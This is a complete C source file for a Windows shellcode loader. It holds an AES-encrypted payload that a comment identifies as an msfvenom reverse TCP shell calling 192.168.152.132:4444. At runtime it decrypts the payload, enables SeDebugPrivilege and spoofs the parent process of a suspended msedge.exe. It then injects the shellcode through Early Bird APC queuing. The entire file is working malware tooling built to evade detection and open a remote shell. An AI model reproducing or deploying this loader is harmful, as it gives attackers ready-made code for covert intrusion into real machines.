#include <Windows.h>
#include <winternl.h>
#include <stdio.h>
#pragma comment(lib, "Bcrypt.lib")

// Define keysize and NTSTATUS codes for AES encryption function
#define NT_SUCCESS(status) (((NTSTATUS)(status)) >= 0)
#define KEYSIZE 32
#define IVSIZE 16

// Define SystemProcessInformation (not always defined in winternl.h)
#define SystemProcessInformation 5

// Define NTSTATUS codes
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)

// Intialize AES struct
typedef struct _AES {
    PBYTE pPlainText;      // base address of the plain text data
    DWORD dwPlainSize;     // size of the plain text data
    PBYTE pCipherText;     // base address of the encrypted data
    DWORD dwCipherSize;    // size of it
    PBYTE pKey;            // the 32 byte key
    PBYTE pIv;             // the 16 byte iv
} AES, * PAES;

// Function to load AES encryption
BOOL InstallAesDecryption(PAES pAes) {
    if (!pAes || !pAes->pCipherText || !pAes->pKey || !pAes->pIv || pAes->dwCipherSize == 0) {
        printf("[!] Invalid AES parameters\n");
        return FALSE;
    }

    BOOL bSTATE = TRUE;
    BCRYPT_ALG_HANDLE hAlgorithm = NULL;
    BCRYPT_KEY_HANDLE hKeyHandle = NULL;
    ULONG cbResult = 0;
    DWORD dwBlockSize = 0;
    DWORD cbKeyObject = 0;
    PBYTE pbKeyObject = NULL;
    PBYTE pbPlainText = NULL;
    DWORD cbPlainText = 0;
    NTSTATUS STATUS = 0;

    STATUS = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptOpenAlgorithmProvider Failed: 0x%0.8X\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }

    STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptGetProperty[1] Failed: 0x%0.8X\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }

    STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptGetProperty[2] Failed: 0x%0.8X\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }

    if (dwBlockSize != 16) {
        printf("[!] Unexpected block size: %d\n", dwBlockSize);
        bSTATE = FALSE; goto _EndOfFunc;
    }

    pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
    if (pbKeyObject == NULL) {
        printf("[!] HeapAlloc for key object failed\n");
        bSTATE = FALSE; goto _EndOfFunc;
    }

    STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptSetProperty Failed: 0x%0.8X\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }

    STATUS = BCryptGenerateSymmetricKey(hAlgorithm, &hKeyHandle, pbKeyObject, cbKeyObject, (PBYTE)pAes->pKey, KEYSIZE, 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptGenerateSymmetricKey Failed: 0x%0.8X\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }

    STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, NULL, 0, &cbPlainText, BCRYPT_BLOCK_PADDING);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptDecrypt[1] Failed: 0x%0.8X\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }

    pbPlainText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbPlainText);
    if (pbPlainText == NULL) {
        printf("[!] HeapAlloc for plaintext failed\n");
        bSTATE = FALSE; goto _EndOfFunc;
    }

    STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, pbPlainText, cbPlainText, &cbResult, BCRYPT_BLOCK_PADDING);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptDecrypt[2] Failed: 0x%0.8X\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }

_EndOfFunc:
    if (hKeyHandle) BCryptDestroyKey(hKeyHandle);
    if (hAlgorithm) BCryptCloseAlgorithmProvider(hAlgorithm, 0);
    if (pbKeyObject) HeapFree(GetProcessHeap(), 0, pbKeyObject);
    if (pbPlainText != NULL && bSTATE) {
        pAes->pPlainText = pbPlainText;
        pAes->dwPlainSize = cbPlainText;
    }
    else if (pbPlainText) {
        HeapFree(GetProcessHeap(), 0, pbPlainText);
    }
    return bSTATE;
}

// Function to decrypt encrypted payload
BOOL SimpleDecryption(IN PVOID pCipherTextData, IN DWORD sCipherTextSize, IN PBYTE pKey, IN PBYTE pIv, OUT PVOID* pPlainTextData, OUT DWORD* sPlainTextSize) {
    if (!pCipherTextData || !sCipherTextSize || !pKey || !pIv || !pPlainTextData || !sPlainTextSize) return FALSE;

    AES Aes = {
        .pKey = pKey,
        .pIv = pIv,
        .pCipherText = pCipherTextData,
        .dwCipherSize = sCipherTextSize
    };

    if (!InstallAesDecryption(&Aes)) return FALSE;

    *pPlainTextData = Aes.pPlainText;
    *sPlainTextSize = Aes.dwPlainSize;
    return TRUE;
}

// Enumereate System Procs and Get Handle
BOOL GetRemoteProcessHandle(LPCWSTR szProcName, DWORD* pdwPid, HANDLE* phProcess) {

    // Function pointer for NtQuerySystemInformation
    typedef NTSTATUS(NTAPI* fnNtQuerySystemInformation)(
        SYSTEM_INFORMATION_CLASS SystemInformationClass,
        PVOID SystemInformation,
        ULONG SystemInformationLength,
        PULONG ReturnLength
        );

    // Variable initialization
    fnNtQuerySystemInformation pNtQuerySystemInformation = NULL;
    ULONG uReturnLen1 = 0, uReturnLen2 = 0;
    PSYSTEM_PROCESS_INFORMATION SystemProcInfo = NULL;
    NTSTATUS STATUS = 0;
    PVOID pValueToFree = NULL;

    // Get NtQuerySystemInformation address
    pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(
        GetModuleHandle(L"NTDLL.DLL"), "NtQuerySystemInformation"
    );
    if (pNtQuerySystemInformation == NULL) {
        printf("[!] GetProcAddress Failed With Error: %d\n", GetLastError());
        return FALSE;
    }

    // First call to get the required buffer size
    STATUS = pNtQuerySystemInformation(SystemProcessInformation, NULL, 0, &uReturnLen1);
    if (STATUS != STATUS_INFO_LENGTH_MISMATCH) {
        printf("[!] NtQuerySystemInformation (First Call) Failed With Error: 0x%0.8X\n", STATUS);
        return FALSE;
    }

    // Allocate memory for the process information array
    SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, uReturnLen1);
    if (SystemProcInfo == NULL) {
        printf("[!] HeapAlloc Failed With Error: %d\n", GetLastError());
        return FALSE;
    }

    // Save initial address for freeing later
    pValueToFree = SystemProcInfo;

    // Second call to get the actual process information
    STATUS = pNtQuerySystemInformation(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2);
    if (STATUS != STATUS_SUCCESS) {
        printf("[!] NtQuerySystemInformation (Second Call) Failed With Error: 0x%0.8X\n", STATUS);
        HeapFree(GetProcessHeap(), 0, pValueToFree);
        return FALSE;
    }

    // Iterate through the process list
    while (TRUE) {
        if (SystemProcInfo->ImageName.Length && _wcsicmp(SystemProcInfo->ImageName.Buffer, szProcName) == 0) {
            // Found the target process
            *pdwPid = (DWORD)SystemProcInfo->UniqueProcessId;
            *phProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *pdwPid);
            if (*phProcess == NULL) {
                printf("[!] OpenProcess Failed With Error: %d\n", GetLastError());
                HeapFree(GetProcessHeap(), 0, pValueToFree);
                return FALSE;
            }
            break;
        }

        // Move to the next entry; stop if NextEntryOffset is 0
        if (!SystemProcInfo->NextEntryOffset)
            break;

        SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
    }

    // Free allocated memory
    HeapFree(GetProcessHeap(), 0, pValueToFree);

    // Check if we found the process
    if (*pdwPid == 0 || *phProcess == NULL) {
        printf("[!] Process '%ws' Not Found or Handle Not Opened\n", szProcName);
        return FALSE;
    }

    return TRUE;
}


BOOL CreateSuspendedProcess(IN LPCWSTR lpProcessName, IN HANDLE hPProc, IN LPCWSTR lpParentProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread, OUT DWORD* dwThreadId) {
    WCHAR lpPath[MAX_PATH * 2] = { 0 };
    WCHAR lpPathAlt[MAX_PATH * 2] = { 0 };
    WCHAR lpCurrentDirectory[MAX_PATH * 2] = { 0 };
    WCHAR WnDr[MAX_PATH] = { 0 };
    SIZE_T sTAttList = 0;
    PPROC_THREAD_ATTRIBUTE_LIST pTAttList = NULL;
    STARTUPINFOEXW SiEx = { 0 };
    PROCESS_INFORMATION Pi = { 0 };
    BOOL bSuccess = FALSE;
    BOOL bPathFound = FALSE;

    // Clear out STARTUPINFO and PROCESS_INFORMATION structs
    RtlSecureZeroMemory(&SiEx, sizeof(STARTUPINFOEXW));
    RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));
    SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXW); // Set the size of STARTUPINFO required for CreateProcessW

    // Get WINDIR environment variable
    DWORD dwResult = GetEnvironmentVariableW(L"WINDIR", WnDr, MAX_PATH);
    if (dwResult == 0 || dwResult >= MAX_PATH) {
        printf("[!] GetEnvironmentVariableW Failed: %d\n", GetLastError());
        return FALSE;
    }

    // Step 1: Check in System32 (for cmd.exe, notepad.exe, etc.)
    swprintf_s(lpPath, sizeof(lpPath) / sizeof(WCHAR), L"%s\\System32\\%s", WnDr, lpProcessName);
    wprintf(L"\n\t[i] Checking for %s in System32: %s ... ", lpProcessName, lpPath);
    if (GetFileAttributesW(lpPath) != INVALID_FILE_ATTRIBUTES) {
        printf("[+] Found\n");
        bPathFound = TRUE;
        wcsncpy_s(lpCurrentDirectory, sizeof(lpCurrentDirectory) / sizeof(WCHAR), lpPath, wcslen(lpPath) - wcslen(lpProcessName) - 1);
    }
    else {
        printf("[!] Not found\n");
    }

    // Step 2: If not found in System32, check Program Files (x86) and Program Files for msedge.exe
    if (!bPathFound && _wcsicmp(lpProcessName, L"msedge.exe") == 0) {
        // Check Program Files (x86)
        swprintf_s(lpPath, sizeof(lpPath) / sizeof(WCHAR), L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe");
        wprintf(L"\t[i] Checking for %s in Program Files (x86): %s ... ", lpProcessName, lpPath);
        if (GetFileAttributesW(lpPath) != INVALID_FILE_ATTRIBUTES) {
            printf("[+] Found\n");
            bPathFound = TRUE;
            wcsncpy_s(lpCurrentDirectory, sizeof(lpCurrentDirectory) / sizeof(WCHAR), lpPath, wcslen(lpPath) - wcslen(lpProcessName) - 1);
        }
        else {
            printf("[!] Not found\n");

            // Check Program Files
            swprintf_s(lpPathAlt, sizeof(lpPathAlt) / sizeof(WCHAR), L"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe");
            wprintf(L"\t[i] Checking for %s in Program Files: %s ... ", lpProcessName, lpPathAlt);
            if (GetFileAttributesW(lpPathAlt) != INVALID_FILE_ATTRIBUTES) {
                printf("[+] Found\n");
                bPathFound = TRUE;
                wcscpy_s(lpPath, sizeof(lpPath) / sizeof(WCHAR), lpPathAlt);
                wcsncpy_s(lpCurrentDirectory, sizeof(lpCurrentDirectory) / sizeof(WCHAR), lpPathAlt, wcslen(lpPathAlt) - wcslen(lpProcessName) - 1);
            }
            else {
                printf("[!] Not found\n");
            }
        }
    }

    // Step 3: If the executable was not found in any location, fail
    if (!bPathFound) {
        printf("[!] Failed to find %s in expected locations\n", lpProcessName);
        return FALSE;
    }

    wprintf(L"\t[i] Using path: %s\n", lpPath);
    wprintf(L"\t[i] Setting current directory to: %s\n", lpCurrentDirectory);

    // Validate the current directory
    if (GetFileAttributesW(lpCurrentDirectory) == INVALID_FILE_ATTRIBUTES || !(GetFileAttributesW(lpCurrentDirectory) & FILE_ATTRIBUTE_DIRECTORY)) {
        printf("[!] Invalid current directory: %s, Error: %d\n", lpCurrentDirectory, GetLastError());
        // Fallback to the calling process's current directory
        if (!GetCurrentDirectoryW(MAX_PATH * 2, lpCurrentDirectory)) {
            printf("[!] GetCurrentDirectoryW Failed: %d\n", GetLastError());
            return FALSE;
        }
        wprintf(L"\t[i] Fallback to current directory: %s\n", lpCurrentDirectory);
    }

    // Initialize the attribute list (first call to get required size)
    if (!InitializeProcThreadAttributeList(NULL, 1, 0, &sTAttList)) {
        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
            printf("[!] InitializeProcThreadAttributeList (size query) Failed With Error: %d\n", GetLastError());
            return FALSE;
        }
    }

    // Allocate memory for the attribute list
    pTAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sTAttList);
    if (pTAttList == NULL) {
        printf("[!] HeapAlloc Failed With Error: %d\n", GetLastError());
        return FALSE;
    }

    // Initialize the attribute list with the allocated memory
    if (!InitializeProcThreadAttributeList(pTAttList, 1, 0, &sTAttList)) {
        printf("[!] InitializeProcThreadAttributeList Failed With Error: %d\n", GetLastError());
        HeapFree(GetProcessHeap(), 0, pTAttList);
        return FALSE;
    }

    // Set the parent process attribute
    if (!UpdateProcThreadAttribute(pTAttList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hPProc, sizeof(HANDLE), NULL, NULL)) {
        printf("[!] UpdateProcThreadAttribute Failed With Error: %d\n", GetLastError());
        DeleteProcThreadAttributeList(pTAttList);
        HeapFree(GetProcessHeap(), 0, pTAttList);
        return FALSE;
    }

    // Assign the attribute list to STARTUPINFOEXW
    SiEx.lpAttributeList = pTAttList;

    // Create the process in suspended state with the validated current directory
    if (!CreateProcessW(
        NULL,
        lpPath,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT,
        NULL,
        lpCurrentDirectory,
        &SiEx.StartupInfo,
        &Pi)) {
        printf("[!] CreateProcessW Failed with Error: %d\n", GetLastError());
        DeleteProcThreadAttributeList(pTAttList);
        HeapFree(GetProcessHeap(), 0, pTAttList);
        return FALSE;
    }

    printf("[+] DONE\n");

    // Store the output values
    *dwProcessId = Pi.dwProcessId;
    *hProcess = Pi.hProcess;
    *hThread = Pi.hThread;
    *dwThreadId = Pi.dwThreadId;

    // Cleanup
    DeleteProcThreadAttributeList(pTAttList);
    HeapFree(GetProcessHeap(), 0, pTAttList);
    // Do not close hParentProcess here; let the caller manage it

    // Verify output values
    if (*dwProcessId == 0 || *hProcess == NULL || *hThread == NULL) {
        printf("[!] Invalid process or thread handles\n");
        if (*hThread) CloseHandle(*hThread);
        if (*hProcess) CloseHandle(*hProcess);
        return FALSE;
    }

    return TRUE;
}

BOOL EarlyBirdAPCStandard(IN HANDLE hProcess, IN HANDLE hThread, IN PVOID pPlainText, IN DWORD dwsPlainTextSize) {
    // Initialize local variables
    PVOID pBaseAddress = NULL;
    DWORD dwOldProtection = NULL;
    SIZE_T sNumberOfBytesWritten = NULL;

    printf("[i] Allocating Memory \n");
    pBaseAddress = VirtualAllocEx(hProcess, NULL, dwsPlainTextSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pBaseAddress == NULL) {
        printf("\n\t[!] VirtualAllocEx Failed: %d", GetLastError());
        VirtualFreeEx(hProcess, pBaseAddress, 0, MEM_RELEASE);
        return FALSE;
    }
    printf("[i] Memory allocated at: 0x%lp\n", pBaseAddress);

    printf("[i] Writing Shellcode to Allocated Memory\n");
    if (!WriteProcessMemory(hProcess, pBaseAddress, pPlainText, dwsPlainTextSize, &sNumberOfBytesWritten) || sNumberOfBytesWritten != dwsPlainTextSize) {
        printf("\n\t[!] WriteProcessMemory Failed: %d", GetLastError());
        VirtualFreeEx(hProcess, pBaseAddress, 0, MEM_RELEASE);
        return FALSE;
    }
    printf("[i] Successfully Wrote %d Bytes \n", sNumberOfBytesWritten);


    if (!VirtualProtectEx(hProcess, pBaseAddress, dwsPlainTextSize, PAGE_EXECUTE_READ, &dwOldProtection)) {
        printf("\n\t[!] VirtalProtect Failed: %d\n", GetLastError());
        VirtualFreeEx(hProcess, pBaseAddress, 0, MEM_RELEASE);
        return FALSE;
    }
    printf("[i] Sucessfully Changed Memory Permission to PAGE_EXECUTE_READ \n");

    QueueUserAPC((PAPCFUNC)pBaseAddress, hThread, NULL);

    printf("[+] Press Enter to Execute Shellcode via APC \n");
    getchar();
    ResumeThread(hThread);

    return TRUE;
}


// Function to enable SeDebugPrivilege
BOOL EnableSeDebugPrivilege() {
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES tp = { 0 };
    LUID luid;
    BOOL bSuccess = FALSE;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        printf("[!] OpenProcessToken Failed: %d\n", GetLastError());
        return FALSE;
    }

    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
        printf("[!] LookupPrivilegeValue Failed: %d\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        printf("[!] AdjustTokenPrivileges Failed: %d\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    // Verify privilege was enabled
    TOKEN_PRIVILEGES prevTp = { 0 };
    DWORD returnLength = 0;
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), &prevTp, &returnLength)) {
        printf("[!] Failed to confirm SeDebugPrivilege: %d\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    if (prevTp.Privileges[0].Attributes & SE_PRIVILEGE_ENABLED) {
        bSuccess = TRUE;
    }
    else {
        printf("[!] SeDebugPrivilege not enabled\n");
    }

    CloseHandle(hToken);
    return TRUE;
}

int main() {
    // msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.152.132 LPORT=4444 -f raw -o reverse-no-exit-func.bin
    unsigned char AesCipherText[] = {
        0x06, 0x50, 0x84, 0x29, 0xE4, 0x0E, 0x60, 0x18, 0x33, 0x15, 0xCA, 0xED, 0xC6, 0x50, 0x37, 0x2E,
        0x02, 0xF7, 0x8C, 0xDD, 0x9D, 0x84, 0x73, 0xA3, 0x23, 0x40, 0xF0, 0x6E, 0xFF, 0x91, 0x1F, 0x3B,
        0x2C, 0x68, 0xD6, 0xA8, 0x38, 0x13, 0xCF, 0x40, 0x3B, 0xAC, 0xE8, 0xDE, 0xFE, 0x98, 0x6E, 0x68,
        0xBF, 0x33, 0xD5, 0xE8, 0x82, 0x5D, 0x24, 0xA1, 0x75, 0x7A, 0xE8, 0xFC, 0x57, 0x66, 0xA2, 0x38,
        0x40, 0xFE, 0x95, 0x37, 0x7C, 0x43, 0x57, 0x2F, 0xE2, 0x37, 0xB8, 0x7C, 0x48, 0x67, 0xE0, 0x4D,
        0x65, 0x1F, 0x5C, 0x0A, 0xF6, 0x45, 0xBB, 0xD1, 0x70, 0xC4, 0x49, 0xBD, 0xB1, 0xC5, 0x6E, 0xE7,
        0x40, 0x68, 0x77, 0xCE, 0xEA, 0xFA, 0xF6, 0x3B, 0x1B, 0xD6, 0x36, 0xBA, 0xAC, 0x4A, 0xEF, 0xBE,
        0x73, 0x05, 0x41, 0x6F, 0xDE, 0xD0, 0x65, 0x2C, 0xCD, 0x5C, 0x2A, 0x9C, 0x8C, 0x3B, 0x31, 0x26,
        0xD3, 0xD2, 0x99, 0xD8, 0x41, 0x1E, 0xA4, 0x50, 0x2A, 0xA0, 0xB6, 0x16, 0x70, 0x8C, 0x70, 0x0F,
        0x61, 0xA7, 0x11, 0x1A, 0xDB, 0x87, 0x91, 0x2E, 0x28, 0x6D, 0x12, 0xE9, 0x56, 0xD2, 0x46, 0x80,
        0x35, 0x4A, 0x97, 0xB5, 0xA8, 0xF6, 0xE4, 0xAA, 0x26, 0xB5, 0xD4, 0xAA, 0x45, 0x33, 0x23, 0x21,
        0xEC, 0x69, 0xF5, 0x2F, 0x51, 0x00, 0x5C, 0xED, 0xD5, 0x90, 0x1B, 0x08, 0xE2, 0xBB, 0xD1, 0x1D,
        0xD2, 0x22, 0xF5, 0x72, 0xBC, 0x6B, 0xBC, 0x4E, 0x28, 0x86, 0x9A, 0xF2, 0x47, 0xC1, 0xBC, 0x61,
        0x2D, 0x55, 0xED, 0x40, 0x96, 0x67, 0x5A, 0x1D, 0xAF, 0x2A, 0xF0, 0xFC, 0x2F, 0x50, 0x03, 0xB1,
        0x2F, 0x95, 0x94, 0x1A, 0xFF, 0x04, 0xAE, 0x71, 0xF0, 0xF8, 0xD7, 0x19, 0x6B, 0xED, 0x99, 0xD9,
        0xBE, 0xF0, 0xC2, 0x88, 0x1C, 0xDC, 0xDA, 0x5E, 0xA9, 0xF0, 0x74, 0xB4, 0xF2, 0x63, 0x55, 0xDE,
        0x50, 0xA9, 0x6A, 0xA1, 0x52, 0x08, 0xF8, 0x06, 0x5E, 0x46, 0x2C, 0x1E, 0x1F, 0x24, 0xC5, 0x41,
        0x28, 0x71, 0xAF, 0x3E, 0x47, 0x9A, 0x05, 0x71, 0xE9, 0xC1, 0xA6, 0xDD, 0xAC, 0xCF, 0x24, 0xB3,
        0x45, 0xD7, 0x53, 0x67, 0x93, 0x7A, 0x91, 0x98, 0x7A, 0x2F, 0x80, 0x76, 0x53, 0x49, 0x21, 0xE8,
        0x32, 0xAE, 0xE4, 0x4D, 0xDC, 0xFA, 0xA8, 0xC8, 0xE6, 0x09, 0x44, 0x35, 0xDA, 0xCE, 0xEC, 0x6B,
        0xE3, 0x3D, 0xD6, 0xDD, 0x78, 0x30, 0xEC, 0x59, 0xDB, 0xD3, 0x90, 0x94, 0xF0, 0xFD, 0xD8, 0x0D,
        0xDD, 0x7B, 0x69, 0xE5, 0xC3, 0x76, 0x6A, 0x3D, 0x8E, 0xB0, 0x14, 0x22, 0x34, 0x90, 0x90, 0x19,
        0xD0, 0x00, 0xB2, 0x76, 0x10, 0x62, 0xF1, 0xFD, 0x94, 0x0B, 0x94, 0xF5, 0x74, 0x8E, 0xC3, 0x2B,
        0x66, 0x94, 0x3F, 0x97, 0x8A, 0x00, 0x18, 0x81, 0xC3, 0x5A, 0x36, 0xAD, 0x93, 0xBD, 0xB3, 0x74,
        0xB1, 0xD7, 0x17, 0xE7, 0x7C, 0x38, 0x95, 0x03, 0xF0, 0xC4, 0xC7, 0x7D, 0xC1, 0xC2, 0xF2, 0x91,
        0x33, 0x76, 0x14, 0x48, 0x7D, 0xC1, 0x18, 0x9D, 0x12, 0x8C, 0x03, 0x40, 0x74, 0x79, 0x48, 0x91,
        0x1F, 0x14, 0x81, 0x94, 0x65, 0x0C, 0x9D, 0xAC, 0xBC, 0xE4, 0x95, 0x44, 0xB5, 0x1A, 0x86, 0x9F,
        0x26, 0x1F, 0xA2, 0x62, 0x55, 0xEF, 0x52, 0x49, 0xE2, 0xAA, 0x72, 0x74, 0xA3, 0xFA, 0xD9, 0x6B,
        0x54, 0xCE, 0x3B, 0xD5, 0x74, 0x7F, 0xDF, 0x4E, 0xB0, 0xE8, 0x99, 0xD8, 0xDD, 0xB6, 0x62, 0x1D };


    unsigned char AesKey[] = {
            0xB5, 0xD5, 0x71, 0xD7, 0x61, 0x3F, 0x24, 0x25, 0x82, 0x01, 0xB1, 0x42, 0x1B, 0x9D, 0xE4, 0xDC,
            0xFB, 0x3D, 0x8A, 0x99, 0xF7, 0xEB, 0xD5, 0xF3, 0x77, 0x04, 0x02, 0x46, 0x34, 0xEA, 0x38, 0x27 };


    unsigned char AesIv[] = {
            0x79, 0x82, 0x6E, 0x03, 0xE6, 0x4B, 0x1D, 0x18, 0x86, 0x0E, 0x2B, 0x26, 0xF0, 0x56, 0x09, 0xAE };

    PVOID pPlainText = NULL;
    DWORD dwsPlainTextSize = 0;
    DWORD ThreadId = 0;
    HANDLE hThread = NULL;
    HANDLE hProcess = NULL;
    DWORD dwProcessId = 0;
    DWORD dwParentPid = 0;
    HANDLE hParentProcess = NULL;
    LPCWSTR TargetProcessName = L"msedge.exe";
    LPCWSTR ParentProcessName = L"msedge.exe";

    // Enable SeDebugPrivilege
    printf("[i] Enabling SeDebugPrivilege...\n");
    if (!EnableSeDebugPrivilege()) {
        printf("[!] Failed to enable SeDebugPrivilege - PPID spoofing may fail\n");
        return 1;
    }
    printf("[i] SeDebugPrivilege enabled successfully\n");

    // Get the handle of the parent process for PPID spoofing
    printf("[i] Getting handle for parent process '%ws'...\n", ParentProcessName);
    if (!GetRemoteProcessHandle(ParentProcessName, &dwParentPid, &hParentProcess)) {
        printf("[!] Failed to get handle for parent process '%ws'\n", ParentProcessName);
        return 1;
    }
    printf("[i] Parent process '%ws' found with PID: %d, Handle: %p\n", ParentProcessName, dwParentPid, hParentProcess);

    // Create the suspended process with the spoofed parent
    printf("[i] Creating Process '%ws' with spoofed parent PID %d...\n", TargetProcessName, dwParentPid);
    if (!CreateSuspendedProcess(TargetProcessName, hParentProcess, NULL, &dwProcessId, &hProcess, &hThread, &ThreadId)) {
        printf("\n\t[!] CreateSuspendedProcess Failed! %d\n", GetLastError());
        CloseHandle(hParentProcess);
        return 1;
    }
    printf("[i] Process Successfully Created! PID -> %d || TID -> %d\n", dwProcessId, ThreadId);
    printf("[i] hProcess: %p, hThread: %p\n", hProcess, hThread);

    // Decrypt the payload
    printf("[i] Decrypting Payload...\n");
    if (!SimpleDecryption(AesCipherText, sizeof(AesCipherText), AesKey, AesIv, &pPlainText, &dwsPlainTextSize)) {
        printf("[!] SimpleDecryption Failed\n");
        CloseHandle(hProcess);
        CloseHandle(hThread);
        CloseHandle(hParentProcess);
        return 1;
    }
    printf("[i] Decrypted payload size: %lu bytes\n", dwsPlainTextSize);

    // Perform Early Bird APC injection
    if (!EarlyBirdAPCStandard(hProcess, hThread, pPlainText, dwsPlainTextSize)) {
        printf("[!] EarlyBirdAPCStandard Failed\n");
        HeapFree(GetProcessHeap(), 0, pPlainText);
        CloseHandle(hProcess);
        CloseHandle(hThread);
        CloseHandle(hParentProcess);
        return 1;
    }

    // Cleanup
    wprintf(L"[+] Early Bird APC completed successfully for %ls\n", TargetProcessName);
    HeapFree(GetProcessHeap(), 0, pPlainText);
    CloseHandle(hProcess);
    CloseHandle(hThread);
    CloseHandle(hParentProcess);

    return 0;
}
